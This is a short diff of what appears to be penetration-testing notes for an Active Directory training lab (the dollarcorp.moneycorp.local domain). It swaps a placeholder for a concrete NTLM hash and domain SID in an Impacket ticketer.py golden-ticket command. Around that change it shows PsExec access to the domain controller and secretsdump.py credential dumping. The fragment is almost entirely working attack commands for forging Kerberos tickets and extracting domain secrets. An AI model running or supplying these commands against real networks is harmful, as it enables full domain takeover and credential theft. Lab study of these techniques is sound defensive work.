@@ -78,8 +78,8 @@ klist
 ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
 PsExec64.exe \\dcorp-dc.dollarcorp.moneycorp.local -u domain\user cmd
 
-# Impacket (Linux) — pass-the-ticket equivalent
-ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain dollarcorp.moneycorp.local Administrator
+# Impacket (Linux) — pass-the-ticket equivalent (substitute real krbtgt NTLM hash and domain SID)
+ticketer.py -nthash 8846f7eaee8fb117ad06bdd830b7586c -domain-sid S-1-5-21-1004336348-1177238915-682003330 -domain dollarcorp.moneycorp.local Administrator
 export KRB5CCNAME=Administrator.ccache
 secretsdump.py -k -no-pass dc01.dollarcorp.moneycorp.local
 ```
